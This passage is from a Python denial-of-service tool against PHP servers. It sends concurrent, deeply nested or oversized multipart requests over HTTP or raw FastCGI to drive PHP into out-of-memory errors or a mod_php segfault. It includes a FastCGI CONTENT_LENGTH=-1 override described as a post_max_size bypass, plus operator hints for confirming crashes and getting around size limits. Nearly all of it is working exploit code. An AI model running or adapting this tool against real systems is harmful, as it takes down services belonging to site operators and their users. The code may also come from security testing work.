    ap.add_argument("--header-lines", type=int, default=0,
                    help="nested: add a part with this many 'a: b' header lines "
                         "(small OOM producer, ~4.8MB at 128M; does NOT produce "
                         "the mod_php SIGSEGV chain in our tests)")
    ap.add_argument("--probe-sizes", action="store_true",
                    help="HTTP only: send increasing body sizes and report "
                         "status/Server to find size limits")
    ap.add_argument("--probe-list", default="0.5,1,2,4,8,16,32",
                    help="comma-separated MiB sizes for --probe-sizes")
    ap.add_argument("--control", action="store_true",
                    help="HTTP only: send one same-size normal multipart field "
                         "plus a health check; prints a verdict")
    ap.add_argument("--control-size-mb", type=float, default=4.8,
                    help="control body size in MiB (default: 4.8)")
    ap.add_argument("--health-url", default=None,
                    help="GET URL for health checks (default: --url)")
    ap.add_argument("--content-length", default=None,
                    help="FastCGI: override CONTENT_LENGTH (e.g. -1 for the "
                         "PHP 5.x negative-length bypass)")
    ap.add_argument("--body-bytes", type=int, default=1000,
                    help="print this many bytes of each PHP response (0 = disable)")
    ap.add_argument("--color", choices=["auto", "always", "never"], default="auto",
                    help="ANSI highlight for oom/empty200/SIGSEGV labels")
    args = ap.parse_args()

    set_color(
        args.color == "always"
        or (args.color == "auto"
            and sys.stdout.isatty()
            and "NO_COLOR" not in os.environ)
    )

    if args.probe_sizes:
        return run_probe_sizes(args)
    if args.control:
        return run_control(args)

    payload = args.payload or "oom"
    if args.payload is None and args.url and not args.no_control:
        run_control(args)
        verdict = getattr(args, "_control_verdict", "")
        if (verdict.startswith("SIZE LIMIT")
                or verdict.startswith("SERVER/UNAVAILABLE")
                or verdict.startswith("SAME-SIZE NORMAL UPLOAD ALSO OOM")):
            print("[*] preflight verdict indicates a size/availability problem; "
                  "skipping the OOM payload")
            return 0

    if payload == "auto":
        return run_auto(args)
    if payload == "all":
        return run_all(args)
    if payload == "oom":
        return run_oom_probe(args)
    if payload == "modphp-crash":
        return run_modphp_crash(args)
    return run_nested(args)


def run_nested(args) -> int:
    # ---- safety checks ----
    if args.url:
        host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
        mode = "http"
        target_desc = args.url
    else:
        if ":" not in args.fcgi:
            ap.error("--fcgi must be host:port")
        host, port_s = args.fcgi.rsplit(":", 1)
        host = host.strip("[]").lower()
        try:
            int(port_s)
        except ValueError:
            ap.error("--fcgi port must be an integer")
        mode = "fcgi"
        target_desc = args.fcgi

    if not (1 <= args.concurrency <= MAX_CONCURRENCY):
        print(f"[!] concurrency must be 1..{MAX_CONCURRENCY}", file=sys.stderr)
        return 2
    if args.requests < 1:
        print("[!] requests must be >= 1", file=sys.stderr)
        return 2
    if not (0 <= args.parts <= 10000):
        print("[!] parts must be 0..10000", file=sys.stderr)
        return 2
    if not (1 <= args.depth <= 60):
        print("[!] depth must be 1..60 (default max_input_nesting_level is 64)",
              file=sys.stderr)
        return 2
    if not (1 <= args.keylen <= 4096):
        print("[!] keylen must be 1..4096", file=sys.stderr)
        return 2
    if args.rate < 0:
        print("[!] rate must be >= 0", file=sys.stderr)
        return 2
    if args.pad_mb < 0:
        print("[!] pad-mb must be >= 0", file=sys.stderr)
        return 2
    if args.big_name_mb < 0:
        print("[!] big-name-mb must be >= 0", file=sys.stderr)
        return 2
    if args.header_lines < 0:
        print("[!] header-lines must be >= 0", file=sys.stderr)
        return 2
    if (args.parts == 0 and args.pad_mb == 0 and args.big_name_mb == 0
            and args.header_lines == 0):
        print("[!] need at least one of --parts / --pad-mb / --big-name-mb / "
              "--header-lines", file=sys.stderr)
        return 2
    if args.content_length is not None and mode != "fcgi":
        print("[!] --content-length only applies to --fcgi mode", file=sys.stderr)
        return 2

    boundary = (args.boundary.encode() if args.boundary
                else b"----oom-" + os.urandom(8).hex().encode())
    body = build_body(args.parts, args.depth, args.keylen, boundary,
                      args.pad_mb, args.big_name_mb, args.header_lines)

    print(
        f"[*] mode={mode} target={target_desc}\n"
        f"[*] body={len(body)}B ({human_size(len(body))}) "
        f"parts={args.parts} depth={args.depth} "
        f"keylen={args.keylen} pad={args.pad_mb}MB "
        f"big_name={args.big_name_mb}MB headers={args.header_lines}\n"
        f"[*] requests={args.requests} concurrency={args.concurrency} "
        f"rate={args.rate or 'unlimited'}"
    )
    if len(body) > 8 * 1024 * 1024:
        if mode == "fcgi" and args.content_length is not None:
            print("[!] body > 8MiB: CONTENT_LENGTH override is the intended "
                  "post_max_size bypass for FastCGI")
        else:
            print("[!] body > 8MiB: nginx client_max_body_size / PHP "
                  "post_max_size may reject it before it can OOM")

    lock = threading.Lock()
    rate_lock = threading.Lock()
    next_slot = [time.monotonic()]
    counters = {"sent": 0, "oom": 0, "errors": 0, "non200": 0, "ok": 0,
                "empty200": 0, "suspected": 0}
    status_counts: dict[str, int] = {}

    def wait_rate() -> None:
        if args.rate <= 0:
            return
        with rate_lock:
            now = time.monotonic()
            delay = max(0.0, next_slot[0] - now)
            next_slot[0] = max(now, next_slot[0]) + 1.0 / args.rate
        if delay:
            time.sleep(delay)

    def worker() -> None:
        while True:
            with lock:
                if counters["sent"] >= args.requests:
                    return
                counters["sent"] += 1
                idx = counters["sent"]
            wait_rate()

            if mode == "http":
                status, data, error = send_http(
                    args.url, body, boundary, args.timeout
                )
                oom = OOM_MARKER in data
                resp_len = len(data)
                empty200 = (status == 200 and resp_len == 0)
                suspected = (not oom) and (empty200 or status in (502, 503, 504))
                with lock:
                    counters["oom"] += int(oom)
                    counters["errors"] += int(bool(error))
                    counters["non200"] += int(status != 200)
                    counters["ok"] += int(status == 200 and not error)
                    counters["empty200"] += int(empty200)
                    counters["suspected"] += int(suspected)
                    key = str(status)
                    status_counts[key] = status_counts.get(key, 0) + 1
                    print(
                        f"[{idx:04d}] status={status} resp={resp_len}B "
                        f"{oom_text(oom)} "
                        f"empty200={bool_text(empty200)} "
                        f"suspected_oom={bool_text(suspected)} err={error!r}",
                        flush=True,
                    )
                    if args.body_bytes > 0 and data:
                        print(f"        head={data[:args.body_bytes]!r}", flush=True)
            else:
                app_status, stdout, stderr, error = send_fcgi(
                    host, int(port_s), args.script, body, boundary,
                    args.timeout, args.content_length
                )
                oom = OOM_MARKER in stdout or OOM_MARKER in stderr
                empty_output = (app_status == 0 and not stdout and not stderr)
                suspected = (not oom) and (app_status is None or bool(error)
                                           or empty_output)
                with lock:
                    counters["oom"] += int(oom)
                    counters["errors"] += int(bool(error))
                    counters["non200"] += int(app_status not in (0, None))
                    counters["ok"] += int(app_status == 0 and not error)
                    counters["suspected"] += int(suspected)
                    key = str(app_status)
                    status_counts[key] = status_counts.get(key, 0) + 1
                    print(
                        f"[{idx:04d}] app_status={app_status} "
                        f"out={len(stdout)}B err={len(stderr)}B "
                        f"{oom_text(oom)} "
                        f"suspected_oom={bool_text(suspected)} err_msg={error!r}",
                        flush=True,
                    )
                    if args.body_bytes > 0 and stdout:
                        print(f"        stdout={stdout[:args.body_bytes]!r}", flush=True)
                    if args.body_bytes > 0 and stderr:
                        print(f"        stderr={stderr[:args.body_bytes]!r}", flush=True)

    threads = [
        threading.Thread(target=worker, daemon=True)
        for _ in range(min(args.concurrency, args.requests))
    ]
    start = time.monotonic()
    for th in threads:
        th.start()
    try:
        for th in threads:
            th.join()
    except KeyboardInterrupt:
        print("\n[!] Ctrl-C", flush=True)

    elapsed = time.monotonic() - start
    print(
        f"\n[*] done: sent={counters['sent']} "
        f"oom={clr(counters['oom'], '1;32' if counters['oom'] else '2')} "
        f"suspected_oom={clr(counters['suspected'], '1;33' if counters['suspected'] else '2')} "
        f"ok={counters['ok']} "
        f"non200={clr(counters['non200'], '1;31' if counters['non200'] else '2')} "
        f"empty200={clr(counters['empty200'], '1;33' if counters['empty200'] else '2')} "
        f"errors={clr(counters['errors'], '1;31' if counters['errors'] else '2')} "
        f"elapsed={elapsed:.1f}s statuses={status_counts}"
    )
    if counters["oom"] == 0 and counters["suspected"]:
        if mode == "http":
            print(
                "[*] OOM likely DID happen, but the fatal error text did not "
                "reach the client (empty 200 / 502).\n"
                "    Add 'fastcgi_buffering off;' to the nginx PHP location so "
                "the HTTP body carries the OOM text."
            )
        else:
            print(
                "[*] FPM likely OOM'd during request startup: the child closed "
                "the FastCGI connection before sending output.\n"
                "    The client-side signal is a broken pipe / empty stdout.\n"
                "    PHP 5.x non-file option: --big-name-mb 26 -n 0 "
                "--content-length -1\n"
                "    (or the larger 1:1 option: --pad-mb 150)"
            )
    elif counters["oom"] == 0:
        print(
            "[*] no OOM marker in the HTTP body. Check that "
            "'fastcgi_buffering off;' is set and that client_max_body_size "
            "allows the payload."
        )
    return 0


if __name__ == "__main__":
    sys.exit(main())
